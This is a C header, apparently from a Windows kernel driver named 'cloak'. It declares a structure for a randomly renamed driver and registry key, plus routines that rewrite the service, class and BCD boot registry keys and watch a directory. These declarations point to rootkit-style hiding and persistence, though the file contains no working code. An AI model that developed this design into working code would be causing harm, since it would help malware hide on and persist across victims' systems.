#ifndef _CLOAK_H_
#define _CLOAK_H_

typedef struct _RUNTIME_INFO {
	ULONG DrvImageSize;
	PUCHAR DrvImageBegin;
	PWCHAR DrvRandName;
	ULONG DrvRandNameLength;
	PWCHAR KeyRandName;
	ULONG KeyRandNameLength;
	PUNICODE_STRING OldDrvPath;
	PUNICODE_STRING OldRegPath;
	ULONG ValueType;
	PIO_APC_ROUTINE fpSvcKeyWorkItem;
	PIO_APC_ROUTINE fpClsKeyWorkItem;
	PIO_APC_ROUTINE fpBcdKeyWorkItem;
	HANDLE hServiceKey;
	HANDLE hClassKey;
	HANDLE hMonitorDir;
	HANDLE hBcdKey;
	IO_STATUS_BLOCK svcKeyIoStatusBlock;
	IO_STATUS_BLOCK clskeyIoStatusBlock;
	IO_STATUS_BLOCK drvFileIoStatusBlock;
	IO_STATUS_BLOCK bcdKeyIoStatusBlock;
	ULONGLONG drvFileBuffer;
	ULONGLONG bogusFileBuffer;
} RUNTIME_INFO, *PRUNTIME_INFO;

PRUNTIME_INFO g_pRunTimeInfo;

void LaunchThread(PVOID pStartContext);
void SenseThread(PVOID pStartContext);
void RewriteSvcKey(PVOID pContext);
void RewriteClsKey(PVOID pContext);
void RewriteBcdKey(PVOID pContext);

#endif

